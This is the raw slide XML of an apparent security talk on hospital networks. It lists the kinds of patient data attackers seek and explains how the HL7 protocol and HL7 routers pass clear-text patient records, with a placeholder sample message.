              </a:contourClr>
            </a:sp3d>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="3100" b="1" cap="all" dirty="0" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>I’m not a doctor…</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3100" cap="all" dirty="0">
              <a:solidFill>
                <a:srgbClr val="82B400"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9144000" cy="180256"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="82B400"/>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8" name="Titre 1"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1768152" y="2060848"/>
            <a:ext cx="7772400" cy="1512168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t" anchorCtr="0">
            <a:noAutofit/>
            <a:scene3d>
              <a:camera prst="orthographicFront"/>
              <a:lightRig rig="soft" dir="t">
                <a:rot lat="0" lon="0" rev="10800000"/>
              </a:lightRig>
            </a:scene3d>
            <a:sp3d>
              <a:bevelT w="27940" h="12700"/>
              <a:contourClr>
                <a:srgbClr val="DDDDDD"/>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800" cap="all" dirty="0" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>But </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8800" cap="all" dirty="0" err="1" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8800" cap="all" dirty="0" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t> play one…</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="8800" cap="all" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Titre 1"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1192088" y="3068960"/>
            <a:ext cx="7772400" cy="936104"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t" anchorCtr="0">
            <a:noAutofit/>
            <a:scene3d>
              <a:camera prst="orthographicFront"/>
              <a:lightRig rig="soft" dir="t">
                <a:rot lat="0" lon="0" rev="10800000"/>
              </a:lightRig>
            </a:scene3d>
            <a:sp3d>
              <a:bevelT w="27940" h="12700"/>
              <a:contourClr>
                <a:srgbClr val="DDDDDD"/>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6800" b="1" cap="all" dirty="0" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>On your network.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="6800" cap="all" dirty="0">
              <a:solidFill>
                <a:srgbClr val="82B400"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Rectangle 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="5134880"/>
            <a:ext cx="9144000" cy="886408"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="82B400"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="63500" sx="102000" sy="102000" algn="ctr"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9" name="TextBox 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="107504" y="5579948"/>
            <a:ext cx="6912768" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0"/>
              <a:t>Tim Elrod &amp; Stefan Morris</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" xmlns="" val="5216974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50"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="8"/>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1"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472008" y="404664"/>
            <a:ext cx="8276456" cy="1008112"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t" anchorCtr="0">
            <a:noAutofit/>
            <a:scene3d>
              <a:camera prst="orthographicFront"/>
              <a:lightRig rig="soft" dir="t">
                <a:rot lat="0" lon="0" rev="10800000"/>
              </a:lightRig>
            </a:scene3d>
            <a:sp3d>
              <a:bevelT w="27940" h="12700"/>
              <a:contourClr>
                <a:srgbClr val="DDDDDD"/>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About</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us</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" cap="all" dirty="0">
              <a:solidFill>
                <a:srgbClr val="82B400"/>
              </a:solidFill>
              <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="7" name="Diagramme 6"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" xmlns="" val="3976806090"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1115616" y="1970720"/>
          <a:ext cx="2304256" cy="33304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9" name="Diagramme 18"/>
          <p:cNvGraphicFramePr/>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" xmlns="" val="3131181214"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="5796136" y="1970720"/>
          <a:ext cx="2304256" cy="333048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cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="28" name="Connecteur droit 27"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4572000" y="1916832"/>
            <a:ext cx="0" cy="3384376"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="3175">
            <a:solidFill>
              <a:srgbClr val="E0D1AE"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw dist="12700" algn="l" rotWithShape="0">
              <a:schemeClr val="bg1"/>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0563443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Graphic spid="7" grpId="0">
        <p:bldAsOne/>
      </p:bldGraphic>
      <p:bldGraphic spid="19"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Why</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would</a:t>
            </a:r>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an</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attacker</a:t>
            </a:r>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care</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0"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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Personally Identifiable Information (PII)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Protected Health Information (PHI)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Payment card data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Identity theft</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>normal ID theft</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>medical identity theft</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Political and social ramifications of PHI disclosure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>McCain questions of fitness for presidency (2008)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>embarrassing or compromising conditions (STDs, mental health)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Loss of Life and Limb</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>HIPAA Doesn’t Help: There’s no PCI for Healthcare</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>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technology</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redux</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>Common Healthcare Protocols:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>HL7</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>DICOM</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>A History of Non-standard Standards</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Doctor’s insist on documenting in their own personal style</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Reflected in all healthcare technology in the form of massive amounts of unstructured data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>Initially created during 70’s and 80’s</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>Dreamt up in committees, engineered in garages.</a:t>
            </a:r>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4365104"/>
            <a:ext cx="9144000" cy="2492896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F6F1DE"/>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solidFill>
                <a:srgbClr val="F1F0DB"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9144000" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:gradFill flip="none" rotWithShape="1">
            <a:gsLst>
              <a:gs pos="0">
                <a:schemeClr val="tx1">
                  <a:lumMod val="95000"/>
                  <a:lumOff val="5000"/>
                </a:schemeClr>
              </a:gs>
              <a:gs pos="100000">
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:gs>
            </a:gsLst>
            <a:path path="circle">
              <a:fillToRect r="100000" b="100000"/>
            </a:path>
            <a:tileRect l="-100000" t="-100000"/>
          </a:gra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5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9144000" cy="180256"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="82B400"/>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8" name="Titre 1"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472008" y="1124744"/>
            <a:ext cx="7772400" cy="1512168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t" anchorCtr="0">
            <a:noAutofit/>
            <a:scene3d>
              <a:camera prst="orthographicFront"/>
              <a:lightRig rig="soft" dir="t">
                <a:rot lat="0" lon="0" rev="10800000"/>
              </a:lightRig>
            </a:scene3d>
            <a:sp3d>
              <a:bevelT w="27940" h="12700"/>
              <a:contourClr>
                <a:srgbClr val="DDDDDD"/>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800" cap="all" dirty="0" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>HL7</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="8800" cap="all" dirty="0">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Rectangle 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="5134880"/>
            <a:ext cx="9144000" cy="886408"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="82B400"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="63500" sx="102000" sy="102000" algn="ctr"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3188948868"/>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smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>hl7</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0"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interface</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>systems</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2800" dirty="0" smtClean="0"/>
              <a:t>Health Level 7 (HL7) Protocol and Standards</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Used to pass data between disparate hospital systems in a standardized format (or at least that’s what they tried to do)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Clear text protocol</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>HL7 segments delimited by \x0d</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Segments always begin with a 3 character name followed by | delimited data fields</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Data fields can be further delimited by ^ and so on and so forth </a:t>
            </a:r>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smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>Hl7</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0"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v2.x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0" smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>example</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>MSH|^~\&amp;|EPIC|EPICADT|SMS|SMSADT|199912271408|CHARRIS|ADT^A04|1817457|D|2.5|</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>PID||0493575^^^2^ID 1|454721||DOE^JOHN^^^^|DOE^JOHN^^^^|19480203|M||B|254 MYSTREET AVE^^MYTOWN^OH^44123^USA||(216)123-4567|||M|NON|400003403~1129086|</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>NK1||ROE^MARIE^^^^|SPO||(216)123-4567||EC|||||||||||||||||||||||||||</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
              <a:t>PV1||O|168 ~219~C~PMA^^^^^^^^^||||277^ALLEN MYLASTNAME^BONNIE^^^^|||||||||| ||2688684|||||||||||||||||||||||||199912271408||||||002376853</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0" smtClean="0"/>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smtClean="0">
                <a:ln w="11430"/>
                <a:solidFill>
                  <a:srgbClr val="82B400"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="25400" algn="tl" rotWithShape="0">
                    <a:srgbClr val="000000">
                      <a:alpha val="43000"/>
                    </a:srgbClr>
                  </a:outerShdw>
                </a:effectLst>
                <a:latin typeface="Nilland-Black" pitchFamily="2" charset="0"/>
              </a:rPr>
              <a:t>hl7</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4800" cap="all" dirty="0"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routers</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Critical middleware that sits at the center of most data flow in a hospital network</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Parses incoming HL7 messages to determine destination based on configured rule sets</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>Routes data between systems that normally would not be able to talk to each other, e.g.:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>upon patient arrival data is entered into an admittance system and then sent to a HL7 router where it is possibly transformed and then transmitted to an Electronic Medical Record (EMR) system for use by hospital staff during the patient’s visit</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>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4365104"/>
            <a:ext cx="9144000" cy="2492896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F6F1DE"/>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solidFill>
                <a:srgbClr val="F1F0DB"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9144000" cy="6858000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:gradFill flip="none" rotWithShape="1">
            <a:gsLst>
              <a:gs pos="0">
                <a:schemeClr val="tx1">
                  <a:lumMod val="95000"/>
                  <a:lumOff val="5000"/>
                </a:schemeClr>
              </a:gs>
              <a:gs pos="100000">
                <a:schemeClr val="tx1">
                  <a:lumMod val="75000"/>
                  <a:lumOff val="25000"/>
                </a:schemeClr>
              </a:gs>
            </a:gsLst>
            <a:path path="circle">
              <a:fillToRect r="100000" b="100000"/>
            </a:path>
            <a:tileRect l="-100000" t="-100000"/>
          </a:gra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5" name="Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9144000" cy="180256"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="82B400"/>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8" name="Titre 1"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="472008" y="1124744"/>
            <a:ext cx="7772400" cy="1512168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t" anchorCtr="0">
            <a:noAutofit/>
            <a:scene3d>
